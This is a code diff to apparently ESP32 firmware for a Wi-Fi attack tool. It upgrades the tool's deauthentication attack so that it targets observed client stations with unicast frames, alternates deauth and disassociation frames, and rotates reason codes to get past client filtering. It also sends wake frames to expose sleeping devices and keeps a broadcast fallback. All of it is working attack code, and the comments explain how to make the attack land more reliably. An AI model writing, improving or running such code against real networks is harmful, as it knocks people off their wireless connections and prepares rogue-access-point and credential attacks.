@@ -26,6 +26,19 @@
 static const char *TAG = "main:attack_method";
 static esp_timer_handle_t deauth_timer_handle = NULL;
 
+/* Deauth burst state. Broadcast-only deauth is discarded by many clients, so the
+   timer aims at the stations the client counter observed and keeps a broadcast
+   in the rotation for the ones it never saw. */
+#define DEAUTH_CLIENT_MAX 16
+static uint8_t deauth_bssid[6];
+static uint8_t deauth_clients[DEAUTH_CLIENT_MAX][6];
+static unsigned deauth_client_count = 0;
+static unsigned deauth_tick = 0;
+/* Reason codes worth rotating through: 1 unspecified, 2 previous auth no longer
+   valid, 4 inactivity, 7 class-3 frame from nonassociated STA, 8 leaving BSS,
+   15 4-way handshake timeout. Clients filter different codes. */
+static const uint8_t deauth_reasons[] = { 7, 1, 2, 4, 8, 15 };
+
 /**
  * @brief True while the AP interface is configured as a clone of the target AP.
  *
@@ -39,12 +52,40 @@ static bool rogue_ap_active = false;
 /**
  * @brief Callback for periodic deauthentication frame timer
  * 
- * Periodicaly called to send deauthentication frame for given AP
- * 
- * @param arg expects wifi_ap_record_t
+ * Periodicaly called to send deauthentication frame for given AP.
+ *
+ * Each tick sends one unicast frame (alternating deauth/disassoc, rotating the
+ * reason code) and every third tick a broadcast frame as a fallback.
+ *
+ * @param arg not used
  */
+static void refresh_deauth_clients(void)
+{
+    unsigned n = wifictl_copy_client_macs(deauth_bssid, deauth_clients, DEAUTH_CLIENT_MAX);
+    if (n > 0) deauth_client_count = n;
+}
+
 static void timer_send_deauth_frame(void *arg){
-    wsl_bypasser_send_deauth_frame((wifi_ap_record_t *) arg);
+    (void) arg;
+    deauth_tick++;
+
+    /* Wake sleeping stations for the first ticks so they answer and the client
+       table can learn their MACs. */
+    if (deauth_tick <= 3) wsl_bypasser_send_null_wake(deauth_bssid);
+
+    /* Re-read the client table about once a second. */
+    if ((deauth_tick % 10) == 1) refresh_deauth_clients();
+
+    uint8_t reason = deauth_reasons[(deauth_tick / 2) % (sizeof(deauth_reasons) / sizeof(deauth_reasons[0]))];
+    bool disassoc = (deauth_tick & 1) != 0;
+
+    if (deauth_client_count > 0) {
+        unsigned idx = (deauth_tick / 2) % deauth_client_count;
+        wsl_bypasser_send_deauth_to(deauth_bssid, deauth_clients[idx], reason, disassoc);
+    }
+    if ((deauth_tick % 3) == 0) {
+        wsl_bypasser_send_deauth_broadcast(deauth_bssid, reason, disassoc);
+    }
 }
 
 /**
@@ -58,6 +99,18 @@ void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_
     if (period_ms == 0) {
         ESP_LOGW(TAG, "Invalid broadcast period, using 100 ms");
         period_ms = 100;
+    }
+
+    /* Snapshot the target so the timer never dereferences a record that a later
+       scan may have overwritten. */
+    memcpy(deauth_bssid, ap_record->bssid, 6);
+    deauth_tick = 0;
+    deauth_client_count = 0;
+    refresh_deauth_clients();
+    if (deauth_client_count == 0) {
+        ESP_LOGI(TAG, "No known stations yet; broadcast plus wake frames until one answers");
+    } else {
+        ESP_LOGI(TAG, "Deauth aimed at %u known station(s)", deauth_client_count);
     }
     if (wifictl_sniffer_is_active()) {
         /* The sniffer already put the radio on the target channel. Reconfiguring
@@ -76,7 +129,7 @@ void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_
     }
     const esp_timer_create_args_t deauth_timer_args = {
         .callback = &timer_send_deauth_frame,
-        .arg = (void *) ap_record
+        .arg = NULL
     };
     esp_err_t err = esp_timer_create(&deauth_timer_args, &deauth_timer_handle);
     if (err != ESP_OK) {
